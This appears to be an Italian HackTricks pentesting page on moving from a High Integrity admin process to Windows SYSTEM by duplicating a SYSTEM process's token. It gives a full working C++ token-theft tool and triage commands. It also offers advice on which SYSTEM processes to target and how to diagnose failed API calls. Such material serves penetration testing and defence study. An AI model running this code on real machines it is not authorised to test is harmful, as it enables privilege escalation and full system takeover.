# SeImpersonate da High a System

{{#include ../../banners/hacktricks-training.md}}

Questa pagina tratta la versione **manuale** del passaggio da un **processo amministratore con High Integrity** a **`NT AUTHORITY\SYSTEM`**, tramite l'**apertura di un processo SYSTEM non protetto, la duplicazione del relativo token e la creazione di un processo figlio con tale token**.

Se disponi solo di **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** ma **non puoi aprire un processo SYSTEM adatto**, il percorso **Potato / named-pipe** è generalmente più affidabile:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Se ciò che vuoi ottenere non è solo `SYSTEM`, ma un **token SYSTEM con il maggior numero possibile di privilegi**, consulta anche:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Triage rapido

Prima di provare a rubare un token, verifica rapidamente il contesto:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Note pratiche:

- Un token admin con **High Integrity** è solitamente sufficiente per **abilitare `SeDebugPrivilege`** e aprire molti processi SYSTEM non protetti.
- **`CreateProcessWithTokenW` richiede `SeImpersonatePrivilege`** nel caller. Se quell'API restituisce `1314`, passa a `CreateProcessAsUserW` dopo aver già duplicato un token primary SYSTEM.
- Su Windows moderni, **`lsass.exe` è spesso un target problematico** perché la **LSA protection / PPL** blocca l'accesso anche agli amministratori con `SeDebugPrivilege`. Preferisci **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** oppure un **`svchost.exe`** iniziale in esecuzione come SYSTEM.
- Non tutti i processi SYSTEM hanno un token altrettanto utile. Se ottieni SYSTEM ma noti privilegi mancanti, prova un processo SYSTEM diverso invece di presumere che la tecnica non funzioni.

## Scegli attentamente il PID

Il modo più semplice per far funzionare questa tecnica in modo affidabile è **scegliere un processo SYSTEM il cui DACL consenta effettivamente agli Administrators di interrogare il processo e duplicarne il token**.

Buoni candidati da testare per primi:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- alcune istanze iniziali di `svchost.exe` in esecuzione come SYSTEM

Evita per impostazione predefinita:

- `lsass.exe` sugli host in cui è abilitata la **RunAsPPL / LSA protection**
- processi protetti o sensibili per la sicurezza che restituiscono `Access denied` anche dopo aver abilitato `SeDebugPrivilege`

Puoi esaminare i processi candidati e i relativi token/ACL con **Process Explorer** o **Process Hacker** in esecuzione con privilegi elevati.

### Codice

Il codice seguente proviene da [questo articolo sugli access token](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Accetta un **process ID come argomento** e avvia una command shell **come l'utente** di quel processo.<sup>[[3]](#references)</sup>\
Eseguendolo in un processo con **High Integrity**, puoi **indicare il PID di un processo in esecuzione come System** (ad esempio `winlogon`, `wininit`) ed eseguire un `cmd.exe` come SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Note utili su API / diritti di accesso

L'esempio usa `MAXIMUM_ALLOWED`, ma per le operazioni reali è utile ricordare i requisiti minimi coinvolti:

- `OpenProcessToken()` richiede solo che l'**handle del processo** sia stato aperto con **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Per usare `CreateProcessWithTokenW()`, l'handle del token **primary** deve avere **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` deve creare un **primary token** (`TokenPrimary`), non solo un token di impersonation.
- Se hai già eseguito l'impersonation di SYSTEM e `CreateProcessWithTokenW()` continua a fallire con `1314`, prova invece `CreateProcessAsUserW()`.

Ciò significa che **aprire il processo target con `PROCESS_ALL_ACCESS` è solitamente superfluo e più rumoroso** rispetto alla semplice richiesta dei diritti necessari per interrogare il token.

## Errore

In alcune occasioni potresti provare a eseguire l'impersonation di SYSTEM senza riuscirci, visualizzando un output simile al seguente:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Questo significa che, anche se stai eseguendo l'operazione con un livello di integrità High, **non disponi di autorizzazioni sufficienti** sul processo/token di destinazione.\
Verifichiamo le autorizzazioni attuali di Administrator sui processi `svchost.exe` con **Process Explorer** (in alternativa puoi usare anche **Process Hacker**):

1. Seleziona un processo `svchost.exe`
2. Fai clic con il pulsante destro del mouse --> Proprietà
3. Nella scheda "Security", fai clic sul pulsante "Permissions" nell'angolo inferiore destro
4. Fai clic su "Advanced"
5. Seleziona "Administrators" e fai clic su "Edit"
6. Fai clic su "Show advanced permissions"

![Codice - Errore: 6. Fai clic su "Show advanced permissions"](<../../images/image (437).png>)

L'immagine precedente contiene tutti i privilegi che "Administrators" possiede sul processo selezionato (come puoi vedere, nel caso di `svchost.exe` dispongono solo dei privilegi "Query").

Visualizza i privilegi che "Administrators" possiede su `winlogon.exe`:

![Codice - Errore: visualizza i privilegi che "Administrators" possiede su winlogon.exe](<../../images/image (1102).png>)

All'interno di quel processo, "Administrators" può eseguire "Read Memory" e "Read Permissions", operazioni che probabilmente consentono agli Administrators di impersonare il token utilizzato da questo processo.

### Cause comuni dei malfunzionamenti

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: la DACL del processo ti blocca oppure il target è **protected/PPL**. Scegli un altro processo SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: l'handle del token è stato aperto senza diritti sufficienti oppure la DACL del token di destinazione impedisce la duplicazione.
- **`CreateProcessWithTokenW()` -> `1314`**: il chiamante non ha attualmente abilitato **`SeImpersonatePrivilege`**. Prova prima ad abilitarlo oppure usa `CreateProcessAsUserW()` con il primary token duplicato.
- **`CreateProcessWithTokenW()` -> `1326`** dopo malfunzionamenti precedenti: spesso significa semplicemente che il precedente passaggio di duplicazione/impersonation del token non è riuscito, quindi non esiste alcun primary token utilizzabile per avviare il processo figlio.

## Note dell'operatore

- Questa tecnica è ottima quando disponi già di **local admin + high integrity** e vuoi semplicemente un percorso rapido e manuale verso SYSTEM, senza avviare un service o una catena di coercion tramite named pipe.
- Negli ambienti Windows 11 / Server hardened, la **LSA protection è sempre più comune**, quindi un workflow che presuppone che `lsass.exe` sia sempre leggibile è fragile. **`winlogon.exe` / `wininit.exe` / `services.exe` sono generalmente scelte iniziali migliori**.<sup>[[2]](#references)</sup>
- Se ottieni un contesto di **service account** invece di un desktop admin elevato, la **Potato family** è generalmente più adatta di questa tecnica.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Abusare dei token di Windows per compromettere Active Directory senza interagire con LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Comprendere e abusare dei Process Tokens — Parte II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
